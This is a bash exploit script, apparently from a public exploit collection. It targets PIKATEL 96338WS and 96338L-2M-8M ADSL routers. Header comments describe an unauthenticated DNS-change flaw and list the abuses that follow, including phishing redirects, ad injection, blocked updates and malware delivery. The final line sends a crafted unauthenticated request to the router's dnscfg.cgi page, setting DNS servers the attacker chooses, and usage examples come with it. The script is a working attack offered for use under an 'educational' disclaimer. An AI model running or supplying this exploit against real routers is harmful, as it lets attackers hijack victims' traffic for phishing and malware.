#!/bin/bash
#
#   PIKATEL 96338WS, 96338L-2M-8M Unauthenticated Remote DNS Change Exploit
#
#  Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#
#  Description:  
#  The vulnerability exist in the web interface, which is 
#  accessible without authentication. 
#
#  Once modified, systems use foreign DNS servers,  which are 
#  usually set up by cybercriminals. Users with vulnerable 
#  systems or devices who try to access certain sites are 
#  instead redirected to possibly malicious sites.
#  
#  Modifying systems' DNS settings allows cybercriminals to 
#  perform malicious activities like:
#
#    o  Steering unknowing users to bad sites: 
#       These sites can be phishing pages that 
#       spoof well-known sites in order to 
#       trick users into handing out sensitive 
#       information.
#
#    o  Replacing ads on legitimate sites: 
#       Visiting certain sites can serve users 
#       with infected systems a different set 
#       of ads from those whose systems are 
#       not infected.
#   
#    o  Controlling and redirecting network traffic: 
#       Users of infected systems may not be granted 
#       access to download important OS and software 
#       updates from vendors like Microsoft and from 
#       their respective security vendors.
#
#    o  Pushing additional malware: 
#       Infected systems are more prone to other 
#       malware infections (e.g., FAKEAV infection).
#
#  Disclaimer:
#  This or previous programs is for Educational 
#  purpose ONLY. Do not use it without permission. 
#  The usual disclaimer applies, especially the 
#  fact that Todor Donev is not liable for any 
#  damages caused by direct or indirect use of the 
#  information or functionality provided by these 
#  programs. The author or any Internet provider 
#  bears NO responsibility for content or misuse 
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact 
#  that any damage (dataloss, system crash, 
#  system compromise, etc.) caused by the use 
#  of these programs is not Todor Donev's 
#  responsibility.
#   
#  Use them at your own risk!
#
#  

if [[ $# -gt 3 || $# -lt 2 ]]; then
        echo "                PIKATEL 96338WS, 96338L-2M-8M ADSL Router " 
        echo "           Unauthenticated Remote DNS Change Exploit"
        echo "  ==================================================================="
        echo "  Usage: $0 <Target> <Primary DNS> <Secondary DNS>"
        echo "  Example: $0 133.7.133.7 8.8.8.8"
        echo "  Example: $0 133.7.133.7 8.8.8.8 8.8.4.4"
        echo ""
        echo "      Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>"
        echo "  https://www.ethical-hacker.org/ https://www.fb.com/ethicalhackerorg"
        exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
        echo "  Error : libwww-perl not found =/"
        exit;
fi
        GET -e "http://$1/dnscfg.cgi?dnsPrimary=$2&dnsSecondary=$3&dnsDynamic=0&dnsRefresh=1" 0&> /dev/null <&1

